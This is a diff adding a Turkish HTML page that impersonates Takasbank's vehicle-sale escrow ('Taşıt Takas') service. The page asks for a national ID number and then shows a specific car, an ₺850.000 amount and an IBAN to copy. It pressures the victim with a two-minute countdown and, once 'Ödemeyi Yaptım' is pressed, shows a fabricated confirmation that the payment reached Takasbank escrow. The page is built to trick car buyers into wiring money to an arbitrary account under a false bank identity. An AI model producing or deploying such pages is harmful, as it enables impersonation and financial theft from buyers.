@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Taşıt Takas Giriş ve Ödeme</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #e2e8f0, #f8fafc);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .logo {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    .logo img {
+      max-width: 240px;
+      width: 100%;
+      height: auto;
+    }
+
+    .container {
+      background: white;
+      padding: 24px;
+      margin-top: 20px;
+      border-radius: 16px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 600px;
+    }
+
+    h2, h1 {
+      text-align: center;
+      color: #1d3765;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 6px;
+      color: #374151;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input[readonly] {
+      background-color: #f1f5f9;
+      cursor: not-allowed;
+    }
+
+    button {
+      width: 100%;
+      background-color: #1d3765;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #2b4b85;
+    }
+
+    .hidden { display: none; }
+
+    .label {
+      font-weight: 600;
+      color: #1d3765;
+    }
+
+    .value {
+      margin: 5px 0 10px 0;
+      padding: 10px;
+      background-color: #f0f2f7;
+      border-radius: 6px;
+    }
+
+    .copy-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .copy-btn {
+      background-color: #1d3765;
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-left: 10px;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+      color: green;
+      text-align: center;
+    }
+
+    .info {
+      font-size: 13px;
+      color: #555;
+      margin-top: 30px;
+      border-top: 1px solid #ccc;
+      padding-top: 15px;
+      line-height: 1.5;
+    }
+  
+    .dot {
+      display: inline-block;
+      animation: blink 1s infinite;
+      color: #1d3765;
+      font-size: 28px;
+    }
+
+    .dot:nth-child(2) { animation-delay: 0.2s; }
+    .dot:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 1; }
+    }
+</style>
+</head>
+<body>
+
+
+<div class="logo">
+  <img src="unnamed.jpg" alt="Taşıt Takas Logo" style="max-width: 320px; width: 100%; height: auto; image-rendering: auto; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.15);" />
+</div>
+
+
+<div class="container" id="girisFormu">
+  <h2>Giriş Yap</h2>
+  <form onsubmit="event.preventDefault(); handleGiris();">
+    <label for="tc">T.C. Kimlik No</label>
+    <input id="tc" name="tc" type="text" maxlength="11" minlength="11" required pattern="[0-9]{11}" inputmode="numeric" placeholder="11 haneli T.C. Kimlik No" />
+    <label for="refno">Referans No</label>
+    <input id="refno" name="refno" type="text" readonly placeholder="Otomatik oluşturulur" />
+    <button type="submit">Devam Et</button>
+  </form>
+</div>
+
+
+<div class="container hidden" id="hazirlaniyorEkrani" style="text-align:center;">
+  <h2 style="color:#1d3765;">Takasbank ödeme ekranı hazırlanıyor...</h2>
+  <div style="font-size: 24px; margin-top: 20px;">
+    <span class="dot">●</span>
+    <span class="dot">●</span>
+    <span class="dot">●</span>
+  </div>
+</div>
+
+<div class="container hidden" id="odemeEkrani">
+  <h1>TaşıtTakas Güvenli Ödeme Bilgileri</h1>
+
+  <div class="label">Araç:</div><div class="value">Fiat Egea 2022 1.6 Multijet Easy Plus</div>
+  <div class="label">Tarih:</div><div class="value">28.07.2025</div>
+  <div class="label">Plaka:</div><div class="value">35 CCY 531</div>
+  <div class="label">Ödenecek Tutar:</div><div class="value">₺850.000</div>
+
+  <div class="label">Takasbank IBAN:</div>
+  <div class="copy-row">
+    <div class="value" id="iban">TR45 0006 2000 1234 5678 9012 34</div>
+    <button class="copy-btn" onclick="copyText('iban')">Kopyala</button>
+  </div>
+
+  <div class="label">Takasbank Alıcı İsmi:</div>
+  <div class="copy-row">
+    <div class="value" id="adsoyad">TAKASBANK A.Ş. EMANET HESABI</div>
+    <button class="copy-btn" onclick="copyText('adsoyad')">Kopyala</button>
+  </div>
+
+  <div class="label">Durum:</div><div class="value" id="status">Ödeme Bekleniyor</div>
+  <button id="payBtn">Ödemeyi Yaptım</button>
+  <div class="status" id="finalStatus"></div>
+  
+<div id="countdown" style="font-size: 1.2rem; font-weight: bold; color: #1e3a8a; background: #e0f2fe; padding: 12px; border-radius: 8px; text-align: center; margin-top: 20px;"></div>
+<div class="info">Bütün işlemler <strong>Takasbank güvencesi</strong> altında yapılmaktadır.</div>
+
+</div>
+
+<script>
+  const tcInput = document.getElementById("tc");
+  const refInput = document.getElementById("refno");
+
+  tcInput.addEventListener("input", function () {
+    const tc = this.value.trim();
+    if (tc.length === 11 && /^[0-9]{11}$/.test(tc)) {
+      const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+      let ref = "TK-";
+      for (let i = 0; i < 6; i++) {
+        ref += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      refInput.value = ref;
+    } else {
+      refInput.value = "";
+    }
+  });
+
+  function handleGiris() {
+    const tc = tcInput.value.trim();
+    const ref = refInput.value.trim();
+    if (tc.length !== 11 || !/^[0-9]{11}$/.test(tc)) {
+      alert("Lütfen geçerli bir 11 haneli T.C. Kimlik No girin.");
+      return;
+    }
+    if (!ref) {
+      alert("Referans numarası oluşturulamadı.");
+      return;
+    }
+    document.getElementById("girisFormu").classList.add("hidden");
+    
+    document.getElementById("girisFormu").classList.add("hidden");
+    document.getElementById("hazirlaniyorEkrani").classList.remove("hidden");
+
+    setTimeout(() => {
+      document.getElementById("hazirlaniyorEkrani").classList.add("hidden");
+      document.getElementById("odemeEkrani").classList.remove("hidden");
+      startCountdown();
+    }, 3000);
+    
+  }
+
+  function copyText(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      alert("Kopyalandı: " + text);
+    });
+  }
+
+  document.getElementById("payBtn").onclick = () => {
+    document.getElementById("status").innerText = "Ödemeniz Takasbank emanet hesabına başarıyla iletilmiştir.";
+    document.getElementById("finalStatus").innerText = "Takasbank tarafından ödeme doğrulama süreci başlatılmıştır.";
+    document.getElementById("payBtn").disabled = true;
+  };
+
+  let countdownElem = document.getElementById("countdown");
+  let totalSeconds = 120;
+  let countdownTimer;
+
+  function startCountdown() {
+    updateCountdown();
+    countdownTimer = setInterval(() => {
+      totalSeconds--;
+      updateCountdown();
+      if (totalSeconds <= 0) {
+        clearInterval(countdownTimer);
+        countdownElem.textContent = "Süre doldu. Lütfen işlemi yeniden başlatın.";
+        alert("Süre doldu! Lütfen işleminize yeniden başlayın.");
+      }
+    }, 1000);
+  }
+
+  function updateCountdown() {
+    const minutes = Math.floor(totalSeconds / 60);
+    const seconds = totalSeconds % 60;
+    countdownElem.textContent = "Kalan Süre: " + minutes + " dk " + (seconds < 10 ? "0" : "") + seconds + " sn";
+  }
+</script>
+
+</body>
+</html>
